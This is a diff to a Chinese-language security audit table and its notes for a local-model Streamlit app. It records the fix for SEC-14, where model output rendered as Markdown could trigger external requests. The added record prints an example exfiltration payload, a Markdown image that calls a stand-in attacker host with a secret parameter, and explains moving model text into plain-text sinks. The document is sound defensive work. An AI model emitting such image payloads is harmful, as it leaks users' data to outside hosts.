@@ -17,7 +17,7 @@
 | SEC-11 | trace 失败与 UI 完成终态矛盾 | P2 | 每个 run 只有一个明确终态 | pushed | `tests/test_trace_terminal_state.py` | `app.py` | `413c6ba7932d2cb793738cd3f7ea072193e42539` | pushed | trace 文件本身安全属性由 SEC-12 处理 |
 | SEC-12 | trace 文件隐私、并发和链接安全问题 | P2 | trace 不泄露、不混写、不跟随链接且可恢复 | pushed | `tests/test_trace_writer.py`; `tests/test_trace_terminal_state.py` | `src/trace_writer.py`; `app.py`; `.gitignore`; `README.md`; `docs/architecture.md` | `2579ac203366d1826b2a83672645dac9b717403f` | pushed | UI 只使用默认脱敏模式 |
 | SEC-13 | CPU 回退永久污染进程环境 | P2 | 后端配置不得跨运行或会话污染 | needs-real-runtime-validation | `tests/test_local_model_client.py` | `src/local_model_client.py` | `8218cdfd40a1c18d9e9e9f6c91a2a4593f86340f` | pushed | CPU/Metal 实际 offload 需真实 GGUF 验证 |
-| SEC-14 | 模型文本经 Markdown 渲染可触发外部请求 | P2 | 模型输出不得触发外部请求 | confirmed | pending | pending | pending | pending | 待处理 |
+| SEC-14 | 模型文本经 Markdown 渲染可触发外部请求 | P2 | 模型输出不得触发外部请求 | fixed-locally | `tests/test_ui_safe_rendering.py`; `tests/test_ui_run_isolation.py` | `src/ui.py`; `app.py` | pending | pending | 待推送 |
 | SEC-15 | 依赖未完整锁定 | P3 | 干净环境安装必须可复现 | confirmed | pending | pending | pending | pending | 待处理 |
 | SEC-16 | 朴素 ZIP 会包含 Git 忽略的敏感文件 | P3 | 敏感文件不得进入最终交付物 | confirmed | pending | pending | pending | pending | 待处理 |
 
@@ -215,3 +215,18 @@
 - **修复后证明：** 同一 CPU→Metal 构造序列保持操作员环境不变；完整本地客户端协议、并发和 runtime 生命周期测试共 12 项通过。
 - **文档与代码差异：** 无；审计描述的顺序依赖可稳定复现。
 - **验证限制：** 未加载真实 GGUF；参数传递路径离线可见，但 CPU/Metal 实际 layer offload 与性能仍需本机运行验证。
+
+## SEC-14 第一性原则记录
+
+- **资产：** 完全本地的数据闭环、用户 IP/时间/URL 参数及模型可能复述的敏感内容。
+- **不可信入口：** 计划 title/summary/策略、审查 summary/finding/recommendation/required change，以及可能包含模型文本的错误。
+- **信任边界：** 通过 Schema 的字符串进入 Streamlit Markdown、状态容器、标题、expander 标签和浏览器 DOM。
+- **被破坏的不变量：** 模型控制的字符串只能作为惰性纯文本显示，不能创建图片、链接、HTML 或其他主动浏览器资源。
+- **最小失败路径：** 模型字段为 `![exfil](https://attacker.invalid/collect?secret=abc)`；bullet、plan summary 和 review summary 分别进入 `st.markdown`、`st.write`、`st.success`。
+- **当前代码为何允许：** Schema 只验证长度与结构；UI 把“已验证字符串”误当作“可安全解释的 Markdown”。
+- **根本原因：** 数据验证边界与输出编码边界混为一谈，没有依据渲染上下文选择纯文本 sink。
+- **修复前失败测试：** 三条恶意 Markdown 回归均失败，mock 分别捕获到动态 payload 进入 markdown/write/success。
+- **最小根本修复：** 所有模型正文改用 `st.text`/`st.code`/`st.json`；状态组件只接收静态文案；finding expander 标签只含序号与受限严重度，类别、问题和建议在内部按纯文本显示；动态错误正文移入代码块。
+- **修复后证明：** bullet、标题、摘要、finding 三类路径均只把恶意 payload 传入纯文本 sink；异常 UI 也只在静态错误框外用 code 显示详情；相邻 run 身份和 trace 终态测试通过。
+- **文档与代码差异：** 无；审计点名的三个 sink 均可稳定复现。
+- **剩余风险：** `st.dataframe` 展示结构化资源字符串但不解释 Markdown；用户主动复制或访问文本中的 URL 不属于自动外部请求。Streamlit 页面级 CSP 仍由部署反向代理负责。
